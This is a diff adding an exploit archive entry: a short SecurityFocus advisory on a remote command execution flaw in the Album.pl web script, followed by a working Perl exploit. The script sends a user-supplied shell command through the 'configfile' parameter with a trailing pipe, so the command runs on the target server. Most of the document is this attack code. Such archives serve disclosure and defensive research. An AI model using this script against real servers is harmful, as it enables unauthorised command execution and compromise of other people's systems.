@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/7444/info
+
+A remote command execution vulnerability has been reported for Album.pl. The vulnerability reportedly exists when alternate configuration files are used.
+
+The precise technical details of this vulnerability are currently unknown. This BID will be updated as further information is available.
+
+#!/usr/bin/perl -w
+
+use LWP::UserAgent;
+use HTTP::Request;
+use HTTP::Response;
+$| = 1;
+
+if (!$ARGV[0] && !$ARGV[1])
+{
+	print "\n Usage: perl $0 <album_uri> \"<command>\" \n\n";
+	exit;
+}
+
+$command="$ARGV[0]?configfile=$ARGV[1]|";
+
+my $conn=LWP::UserAgent->new();
+my $data=HTTP::Request->new(GET => $command);
+my $result=$conn->request($data);
+if ($result->is_error())
+{
+	printf " %s\n", $result->status_line;
+}
+else
+{
+	print "Success: $result\n";
+}
